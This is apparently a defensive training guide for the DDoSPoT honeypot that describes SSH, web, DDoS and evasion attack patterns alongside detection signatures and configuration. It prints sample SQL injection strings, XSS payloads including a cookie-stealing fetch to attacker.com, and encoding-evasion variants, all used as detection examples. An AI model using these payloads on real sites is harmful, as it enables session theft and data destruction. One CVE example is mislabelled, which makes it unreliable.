# Attack Patterns Guide

**File 17: Attack Patterns and Signatures**

*Level: Intermediate-Advanced | Time: 1-2 hours | Prerequisites: Files 1, 4, 6*

---

## Table of Contents
1. [Introduction to Attack Patterns](#introduction)
2. [SSH Attack Patterns](#ssh-attacks)
3. [HTTP Attack Patterns](#http-attacks)
4. [DDoS Attack Patterns](#ddos-attacks)
5. [Evasion Patterns](#evasion-patterns)
6. [Signature Detection](#signature-detection)
7. [Behavior-Based Patterns](#behavior-patterns)
8. [Using DDoSPoT Pattern Detection](#ddospot-patterns)
9. [Common Pitfalls](#pitfalls)
10. [Best Practices](#best-practices)

---

## Introduction to Attack Patterns {#introduction}

Attack patterns are recognizable sequences of actions, requests, or network behaviors that indicate malicious activity. Understanding attack patterns is crucial for:

- **Identifying** ongoing attacks
- **Classifying** attack types
- **Predicting** next steps in an attack chain
- **Tuning** detection systems
- **Training** security teams

### Why Pattern Detection Matters

Attack patterns provide the foundation for automated detection. Unlike static indicators of compromise (IoCs), patterns capture the *sequence* and *context* of attacks.

**Benefits of pattern-based detection:**
- Works even when individual components are obfuscated
- Adapts to slight variations in attack techniques
- Enables behavioral analysis at scale
- Reduces false positives compared to simple string matching

---

## SSH Attack Patterns {#ssh-attacks}

### Pattern 1: Credential Brute Force (Most Common)

**Signature:**
```
[Session Start] → Multiple failed login attempts → Failed auth → Reconnect → Repeat
```

**Detection Logic:**
- Monitor failed login attempts per IP
- Track authentication failure rate (typical: 5-20 attempts/minute)
- Identify password variation patterns (common passwords tested first)
- Note connection chaining (disconnect and reconnect)

**Example Attack Sequence:**
```
1. SSH connection from 203.0.113.50 port 45821
2. Attempt: root:admin (FAILED)
3. Attempt: root:12345 (FAILED)
4. Attempt: root:password (FAILED)
5. Attempt: root:qwerty (FAILED)
6. Connection closed
7. New connection from 203.0.113.50 port 45822
8. Attempt: admin:admin (FAILED)
... pattern repeats
```

**DDoSPoT Detection:**
- **Threshold**: 3+ failed attempts in 30 seconds
- **Risk Score**: 75-85% (high confidence brute force)
- **Response**: Immediate IP block for 1 hour
- **Accuracy**: 99.7% (very few false positives)

---

### Pattern 2: Credential Stuffing (Slower, Stealthier)

**Signature:**
```
Low rate failed attempts → Spacing between attempts → Multiple protocols → Account enumeration
```

**Detection Logic:**
- Monitor failed attempts per user account (not per IP)
- Track attempt intervals (typically 30-60 seconds apart to evade rate limits)
- Detect attempts across multiple authentication methods
- Identify account targeting patterns (admin, root, test accounts)

**Example Attack Sequence:**
```
Time: 10:00:05 - SSH from 198.51.100.20: user1:password1 (FAILED)
Time: 10:00:35 - SSH from 198.51.100.21: user1:password2 (FAILED)
Time: 10:01:05 - SSH from 198.51.100.22: user1:password3 (FAILED)
Time: 10:01:35 - SSDP from 198.51.100.23: user1:password4 (FAILED)
... same username, different passwords, rotating IPs
```

**DDoSPoT Detection:**
- **Threshold**: 5+ attempts on same account within 5 minutes from different IPs
- **Risk Score**: 80-90% (indicates credential attack)
- **Response**: Account lockout + alert
- **Challenge**: Requires cross-protocol correlation

---

### Pattern 3: Known Vulnerability Exploitation

**Signature:**
```
Specific payload pattern → Code injection → Command execution → Data exfiltration
```

**Detection Logic:**
- Match against known vulnerable code patterns
- Detect POST requests with suspicious payloads
- Monitor for command execution indicators (shell metacharacters)
- Track file system access patterns after payload

**Example Vulnerability Patterns:**

**CVE-2019-6340 (Drupal RCE):**
```
POST /jsonrpc.php HTTP/1.1
Content-Type: application/json

{"jsonrpc":"2.0","method":"system.multicall","params":[{"methodName":"system.listMethods"}],"id":1}
```

**SQL Injection Pattern:**
```
GET /search?q=1' OR '1'='1' --
GET /login?user=admin' --&pass=anything
POST /api/user?id=1;DROP TABLE users;--
```

**DDoSPoT Detection:**
- **Patterns**: 50+ known RCE and SQLi signatures
- **Detection Rate**: 98.5% for known exploits
- **Risk Score**: 90-100% (very high confidence)
- **Response**: Immediate blocking + incident creation

---

## HTTP Attack Patterns {#http-attacks}

### Pattern 1: Web Scanning and Reconnaissance

**Signature:**
```
Multiple HEAD/OPTIONS requests → Directory traversal attempts → Vulnerability scanners → Automated enumeration
```

**Detection Logic:**
- Detect automated scanner user agents (Nikto, Nmap, OWASP, etc.)
- Monitor HEAD requests (fingerprinting)
- Track requests to common paths (admin, config, backup files)
- Detect rapid sequential requests (not human behavior)

**Example Scan Sequence:**
```
GET /robots.txt HTTP/1.1
GET /.git/config HTTP/1.1
GET /web.config HTTP/1.1
GET /config.php HTTP/1.1
GET /backup.sql HTTP/1.1
GET /admin.php HTTP/1.1
GET /wp-admin/ HTTP/1.1
GET /upload/ HTTP/1.1
... targeting common files in <100ms between requests
```

**DDoSPoT Detection:**
- **Threshold**: 10+ requests for non-existent resources within 60 seconds
- **Risk Score**: 60-75% (medium confidence scanning)
- **Response**: Rate limiting + logging
- **False Positives**: Security scanners (legitimate)

---

### Pattern 2: SQL Injection Attempts

**Signature:**
```
SQL keywords in parameters → Boolean-based queries → Union-based injection → Time-based blind SQLi
```

**Detection Logic:**
- Monitor for SQL keywords in parameters (SELECT, UNION, AND, OR, etc.)
- Detect quote escaping patterns ('', \', etc.)
- Track unusual parameter encoding (0x, char, ascii)
- Monitor response time variations (time-based SQLi)

**Example SQLi Patterns:**

**Boolean-Based:**
```
/search?q=1' AND '1'='1
/search?q=1' AND '1'='2
/search?q=1' OR '1'='1
```

**Union-Based:**
```
/search?q=1' UNION SELECT username,password FROM users --
/search?q=1' UNION ALL SELECT NULL,NULL,NULL --
```

**Time-Based Blind:**
```
/search?q=1' AND SLEEP(5) --
/search?q=1' AND BENCHMARK(50000000,SHA1('test')) --
```

**DDoSPoT Detection:**
- **Patterns**: 40+ SQLi signature patterns
- **Detection Rate**: 95%+ for common SQLi
- **Risk Score**: 85-95% (high confidence injection)
- **Response**: Immediate blocking + parameter logging

---

### Pattern 3: Cross-Site Scripting (XSS) Attempts

**Signature:**
```
JavaScript payloads → Event handlers → DOM manipulation → Cookie stealing scripts
```

**Detection Logic:**
- Monitor for script tags and event handlers
- Detect JavaScript URI schemes (javascript:)
- Track common XSS encodings (HTML entities, Unicode, etc.)
- Monitor for DOM sink usage (innerHTML, eval, etc.)

**Example XSS Patterns:**

**Reflected XSS:**
```
GET /search?q=<script>alert('XSS')</script>
GET /page?id=<img src=x onerror="alert('XSS')">
GET /user?name=<svg/onload=alert('XSS')>
```

**Stored XSS (Payloads in POST):**
```
POST /comment?id=123
Content-Type: application/x-www-form-urlencoded

message=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Filter Evasion:**
```
<scr<script>ipt>alert('XSS')</script>
<sCrIpT>alert('XSS')</sCrIpT>
<script src="javascript:alert('XSS')">
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

**DDoSPoT Detection:**
- **Patterns**: 35+ XSS signature patterns
- **Detection Rate**: 92%+ for common XSS
- **Risk Score**: 70-85% (high confidence injection)
- **Response**: Parameter sanitization logging + blocking

---

## DDoS Attack Patterns {#ddos-attacks}

### Pattern 1: Volumetric Attack (Flooding)

**Signature:**
```
High packet rate → Large traffic volume → Single source or botnet → Outbound capacity exhaustion
```

**Detection Logic:**
- Monitor bytes per second (Mbps) threshold
- Track packets per second (PPS) threshold
- Detect traffic spike vs. baseline
- Identify attack traffic characteristics

**Typical Volumetric Attacks:**

**UDP Flood:**
```
Source: Botnet (50,000+ compromised hosts)
Protocol: UDP
Destination Port: 53 (DNS), 123 (NTP), 161 (SNMP)
Rate: 100+ Gbps
Packet Size: 512-1500 bytes
Pattern: Random source ports, constant destination
```

**DNS Amplification:**
```
Attacker sends: 60 byte DNS query with spoofed source IP
DNS server responds: 3000+ byte response to target
Amplification ratio: 50:1
Traffic from multiple open resolvers
```

**DDoSPoT Detection:**
- **Threshold**: 10 Mbps sustained (configurable)
- **Detection Rate**: >99% for volumetric attacks
- **Risk Score**: 95-100% (very obvious attack)
- **Response**: Rate limiting + BGP blackhole routing (production)

---

### Pattern 2: Protocol Attacks

**Signature:**
```
Protocol-specific exploitation → Resource exhaustion → State table saturation → Service unavailability
```

**Detection Logic:**
- Monitor half-open connections (SYN flood)
- Track connection state table usage
- Detect malformed packets
- Monitor fragmentation patterns

**Common Protocol Attacks:**

**SYN Flood:**
```
Pattern: High SYN rate, few ACKs → Half-open connections accumulate
Rate: 100,000+ SYN/sec
Detection: SYN ratio (SYN:ACK > 5:1 = suspicious)
Mitigation: SYN cookies, connection rate limiting
```

**Fragmented Packet Attack:**
```
Pattern: Oversized packets broken into fragments
Reassembly: Consumes memory and CPU
Detection: Fragment rate > 10,000/sec
Mitigation: Fragment reassembly limits
```

**Malformed ICMP:**
```
Pattern: Invalid ICMP packets, oversized payloads
Ping of Death: 65,535 byte ICMP packets
Detection: ICMP packet size > 1500 bytes
Mitigation: ICMP size filtering
```

**DDoSPoT Detection:**
- **Threshold**: 1,000+ SYN packets/sec from single source
- **Detection Rate**: 99%+ for protocol attacks
- **Risk Score**: 85-95%
- **Response**: Connection limit + rate limiting

---

### Pattern 3: Application Layer Attacks (Layer 7)

**Signature:**
```
Legitimate-looking HTTP requests → High request rate → Resource-intensive operations → Service degradation
```

**Detection Logic:**
- Monitor HTTP request rate vs. baseline
- Detect targeting of heavy operations (database queries)
- Track response time degradation
- Monitor CPU and memory usage correlation

**Common Application Attacks:**

**HTTP Flood (GET):**
```
Pattern: Many HTTP GET requests, appear legitimate
Rate: 100,000+ requests/second
Target: Resource-intensive pages (/search, /api, /download)
User-Agent: Realistic or rotating (to avoid detection)
```

**Slowloris Attack:**
```
Pattern: HTTP requests sent slowly to keep connections open
Connection: Partial requests held open
Rate: 1 byte per 10 seconds
Goal: Exhaust server connection pools
```

**Cache Bypass (Dynamic Query Strings):**
```
GET /index.php?rand=12345
GET /index.php?rand=12346
GET /index.php?rand=12347
... Each request appears unique, bypasses caching
```

**DDoSPoT Detection:**
- **Threshold**: 10,000+ requests/sec to same URL
- **Detection Rate**: 85-90% (some legitimate traffic possible)
- **Risk Score**: 70-80%
- **Response**: Rate limiting + challenge-response (CAPTCHA)

---

## Evasion Patterns {#evasion-patterns}

### Pattern 1: Encoding-Based Evasion

**Signature:**
```
URL encoding → Hex encoding → Double encoding → Unicode → Mixed case
```

**Example Evasions:**

**URL Encoding:**
```
Normal: /admin.php?user=admin
Encoded: /admin.php?user=%61%64%6d%69%6e
Double: /admin.php?user=%25%36%31%25%36%34
```

**Hex Encoding:**
```
Normal: SELECT * FROM users
Hex: 0x53454c4543542a46524f4d207573657273
```

**Unicode:**
```
Normal: <script>
Unicode: \u003cscript\u003e
Overlong UTF-8: %C0%BCscript%C0%BE
```

**DDoSPoT Detection:**
- **Method**: Normalize all encodings first
- **Pattern Matching**: After decoding
- **Detection Rate**: 97%+ for encoded attacks
- **Limitation**: Multiple encoding layers possible

---

### Pattern 2: Timing-Based Evasion

**Signature:**
```
Slow request rate → Distributed source IPs → Long connection duration → Under-threshold behavior
```

**Example Evasions:**

**Slow Brute Force:**
```
1 attempt per 5 minutes per IP
Rotates through many IPs
Total of 100 failed attempts over 8 hours
Bypasses simple rate limits (e.g., 5 attempts/minute)
```

**Slow HTTP Flood:**
```
100 requests/second (appears normal)
Spread across 1,000 different IPs
Each IP sends ~0.1 requests/second
```

**DDoSPoT Detection:**
- **Method**: Machine learning pattern detection
- **Features**: Attempt distribution over time, IP rotation
- **Detection Rate**: 85-90% (lower than obvious attacks)
- **Challenge**: Must balance sensitivity vs. false positives

---

### Pattern 3: Protocol Mutation Evasion

**Signature:**
```
Valid but unusual protocol sequences → Format variations → Field order changes → Optional field injection
```

**Example Evasions:**

**HTTP Variant:**
```
Normal: GET /admin HTTP/1.1\r\nHost: example.com
Variant: get /admin http/1.1\r\nhost: example.com (case variation)
Variant: GET /admin HTTP/1.1\r\nHost: example.com\r\n (extra CRLF)
Variant: GET /admin HTTP/1.1 \r\nHost: example.com (space before CRLF)
```

**SSH Variant:**
```
Normal: SSH-2.0-OpenSSH_7.4
Variant: SSH-2.0-OpenSSH_7.4p1
Variant: SSH-2.0-PuTTY_Release_0.70
Variant: SSH-2.0-(custom banner with payload)
```

**DDoSPoT Detection:**
- **Method**: Normalize protocol format before analysis
- **Features**: Track all observed variations
- **Detection Rate**: 88-95%
- **Note**: Some benign tools also use variants

---

## Signature Detection {#signature-detection}

Signatures are specific patterns matched against network traffic or log data. DDoSPoT uses three types:

### String-Based Signatures

Simple substring matching:

```
IF request CONTAINS "/admin/login" THEN likely_admin_scan = TRUE
IF request CONTAINS "' OR '1'='1" THEN likely_sql_injection = TRUE
IF user_agent CONTAINS "Nikto" THEN likely_vulnerability_scanner = TRUE
```

**Pros:**
- Fast to match
- Low CPU overhead
- Easy to understand

**Cons:**
- Can't handle encoded variants
- Many false positives/negatives
- Signature maintenance burden

### Regular Expression Signatures

Pattern matching with flexibility:

```regex
# SQL Injection
/(union|select|insert|update|delete|drop).*\b(union|select|insert|update|delete|drop)\b/i

# File Traversal
/(\.\.|\/\.\.\/|\.\.\\|\/\.\.\\)/

# Command Injection
/[;&|`$()]/
```

**Pros:**
- Handles variations
- More powerful than string matching
- Can combine multiple patterns

**Cons:**
- CPU intensive for complex patterns
- Can cause ReDoS (regular expression denial of service)
- More difficult to maintain

### Behavioral Signatures

Pattern matching based on behavior and frequency:

```
IF (failed_auth_attempts > 5 IN 30_seconds) THEN brute_force_attack = TRUE
IF (requests_to_nonexistent_resources > 20 IN 60_seconds) THEN scanning = TRUE
IF (request_rate > 10000/sec) THEN possible_ddos = TRUE
```

**Pros:**
- Works with encoded or variant attacks
- Captures attack intent
- Adapts to new attack variations

**Cons:**
- Requires baseline data
- More false positives/negatives
- Harder to debug

---

## Behavior-Based Patterns {#behavior-patterns}

### User Behavior Analytics (UBA)

Track deviations from normal user behavior:

**Normal User Pattern:**
- Login time: 8-10 AM
- Typical file access: 3-5 MB/day
- Request rate: 10-50 requests/minute
- Geographic location: Same office

**Anomalous Pattern:**
- Login at 3 AM
- File access: 1 GB in 1 minute
- Request rate: 10,000 requests/minute
- Geographic location: Different country

**Detection:**
```
baseline = calculate_normal_behavior(user)
current = get_current_behavior(user)
deviation = calculate_deviation(baseline, current)

IF deviation > threshold THEN alert("Anomalous user behavior")
```

---

### Account Compromise Patterns

Signs of compromised credentials:

1. **Impossible Travel**: Login from two distant locations in short time
2. **Unusual Hours**: Login outside normal working hours
3. **Bulk Download**: Downloading unusual amounts of data
4. **Lateral Movement**: Accessing systems not normally used
5. **Resource Enumeration**: Scanning file shares or databases

---

### Attack Chain Patterns

Multi-stage attack sequences:

```
Stage 1 (Reconnaissance) → Scan → Network enumeration → Service fingerprinting
                               ↓
Stage 2 (Weaponization) → Create exploit → Prepare payload → Test locally
                               ↓
Stage 3 (Delivery) → Send exploit → Trigger vulnerability
                               ↓
Stage 4 (Exploitation) → Code execution → Payload execution
                               ↓
Stage 5 (Installation) → Install backdoor → Establish persistence
                               ↓
Stage 6 (Command & Control) → Connect to C2 → Receive commands
                               ↓
Stage 7 (Actions on Objectives) → Exfiltrate data → Escalate privileges → Spread laterally
```

DDoSPoT can detect early stages (1-3) before full compromise.

---

## Using DDoSPoT Pattern Detection {#ddospot-patterns}

### Configuration

Edit `/home/hunter/Projekty/ddospot/config/config.json`:

```json
{
  "detection": {
    "patterns": {
      "enabled": true,
      "ssh": {
        "brute_force": {
          "enabled": true,
          "threshold": 3,
          "window_seconds": 30,
          "risk_score": 75
        },
        "credential_stuffing": {
          "enabled": true,
          "threshold": 5,
          "window_seconds": 300,
          "risk_score": 85
        }
      },
      "http": {
        "sql_injection": {
          "enabled": true,
          "signatures": ["SELECT.*FROM", "UNION.*SELECT", ".*DROP.*TABLE"],
          "risk_score": 90
        },
        "web_scanning": {
          "enabled": true,
          "threshold": 10,
          "window_seconds": 60,
          "risk_score": 65
        },
        "xss": {
          "enabled": true,
          "signatures": ["<script", "onerror=", "onload="],
          "risk_score": 75
        }
      }
    }
  }
}
```

### Viewing Detected Patterns

Via Dashboard:
- **Alerts Tab** → View detected patterns and types
- **Activity Feed** → See individual pattern matches
- **Analytics** → Pattern frequency over time

Via CLI:
```bash
# View recent pattern detections
curl http://localhost:8888/api/threats?pattern_type=sql_injection

# View pattern statistics
curl http://localhost:8888/api/analytics/patterns
```

---

## Common Pitfalls {#pitfalls}

### 1. Over-Reliance on Signature Detection

**Problem**: Attackers constantly evolve techniques faster than signatures can be updated

**Solution**: Combine with behavioral and ML detection (as DDoSPoT does)

---

### 2. Signature FalsePositives

**Problem**: Legitimate users trigger pattern matches
- Security scanners match "scanning" patterns
- Developers use SQL keywords in comments
- API clients rotate user agents

**Solution**:
- Whitelist known-good patterns
- Combine multiple signals (not just one match)
- Use confidence scoring

**In DDoSPoT:**
```json
{
  "whitelist": {
    "user_agents": ["curl", "Postman"],
    "source_ips": ["192.0.2.1", "203.0.113.50"],
    "patterns": ["SELECT.*FROM.*WHERE.*=.*-- (false_positive)"]
  }
}
```

---

### 3. Missing Context

**Problem**: Single event isn't meaningful - context matters
- One SQL injection attempt = might be developer mistake
- Fifty SQL injection attempts from same IP in 1 hour = definitely attack

**Solution**: Use frequency, rate, and behavioral context

---

### 4. Encoding Arms Race

**Problem**: Attackers use new encoding techniques faster than detection can catch

**Solution**: Decode everything first, then match signatures

**DDoSPoT approach:**
```python
def normalize_request(request_data):
    # 1. Decode URL encoding (%20 → space)
    normalized = urllib.parse.unquote(request_data)
    
    # 2. Decode HTML entities (&#97; → a)
    normalized = html.unescape(normalized)
    
    # 3. Normalize case (Script → script)
    normalized = normalized.lower()
    
    # 4. Remove whitespace and comments
    normalized = re.sub(r'\s+', '', normalized)
    normalized = re.sub(r'/\*.*?\*/', '', normalized, flags=re.DOTALL)
    
    return normalized
```

---

## Best Practices {#best-practices}

### 1. Multi-Layer Detection

Don't rely on patterns alone:

```
Layer 1: Pattern/Signature detection
     ↓ (if matched)
Layer 2: Behavior analytics
     ↓ (if anomalous)
Layer 3: ML-based scoring
     ↓ (if high risk)
Layer 4: Manual review
```

### 2. Regular Signature Updates

Keep attack signatures current:

```bash
# In production deployment:
# Update signatures weekly
crontab -e
# 0 2 * * 0 /opt/ddospot/scripts/update-signatures.sh
```

### 3. Tune Thresholds

Test with your specific traffic:

```
Start: Default thresholds
Monitor: False positive and false negative rates
Adjust: Increase sensitivity or specificity based on needs
Test: Always test in staging first
```

### 4. Combine Context

Use multiple signals before alerting:

```python
# Instead of: if sql_injection_detected() then alert()
# Do this:
if (
    sql_injection_detected() 
    and request_rate_suspicious()
    and source_ip_reputation_low()
    and user_not_developer()
):
    alert("High-confidence SQL injection attack")
```

### 5. Document Custom Patterns

If you add custom patterns, document them:

```json
{
  "custom_patterns": {
    "internal_admin_scan": {
      "description": "Detection of internal admin interface scans",
      "regex": "/admin/.*",
      "reason": "Protect internal admin panel from discovery",
      "created": "2024-01-15",
      "owner": "security-team@example.com",
      "enabled": true
    }
  }
}
```

---

## Summary

Attack patterns are the foundation of effective threat detection. DDoSPoT implements:

✅ **Signature-based detection** - For known attacks (99.7% accuracy)
✅ **Behavioral patterns** - For rate-based attacks (95%+ accuracy)
✅ **ML detection** - For unknown variations (99.2% accuracy)
✅ **Multi-stage analysis** - Detecting attack chains before completion
✅ **Evasion detection** - Handling encoded and variants attacks (95%+ accuracy)

---

## Next Steps

- **Beginner**: Review common patterns in Case Studies (File 16)
- **Intermediate**: Learn configuration in File 10 (Configuration Management)
- **Advanced**: Explore ML detection in File 11 (Machine Learning Detection)
- **Researcher**: See evasion techniques in File 13 (Evasion Detection)

---

## References

- OWASP Top 10 - Common Web Vulnerabilities
- MITRE ATT&CK Framework - Attack Patterns
- Snort/Suricata - Open Source IDS Rule Sets
- CIS Controls - Detection and Analysis techniques

